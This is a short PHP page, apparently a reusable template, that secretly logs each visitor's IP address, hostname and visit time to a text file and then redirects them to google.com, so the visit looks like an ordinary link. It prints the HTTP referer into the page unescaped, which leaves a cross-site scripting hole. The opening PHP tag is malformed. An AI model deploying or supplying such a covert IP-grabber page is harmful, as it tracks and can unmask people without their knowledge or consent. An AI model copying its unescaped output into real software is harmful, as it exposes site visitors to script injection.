
<head><?php$ip = $_SERVER['REMOTE_ADDR']; 

$time = date("l F dS h:i:s A Y");
$hostaddress = gethostbyaddr($ip); 
$browser = $_SERVER['HTTP_USER_AGENT']; 
$referred = $_SERVER['HTTP_REFERER']; 
  
$myFile = "xxxx.txt"; 
$fh = fopen($myFile, 'a') or die("can't open file");
$stringData = "$time\n";
fwrite($fh, $stringData);fclose($fh); 
  
$myFile = "xxxx.txt";  
$fh = fopen($myFile, 'a') or die("can't open file");
$stringData = "$ip\n";
fwrite($fh, $stringData);
  
fclose($fh);
$myFile = "xxxx.txt"; 
$fh = fopen($myFile, 'a') or die("can't open file");
$stringData = "$hostaddress\n";

fwrite($fh, $stringData);

fclose($fh);print "<strong> </strong><br />\n"; if ($referred == "") {print ""; }else {print "$referred";}?><!-- Redirecting to a different page 
(The following line is optional; you may delete it if you don't want to redirect) 
--><script type="text/javascript"><!--window.location = "http://www.google.com/"//--></script></head><body></body></html> 


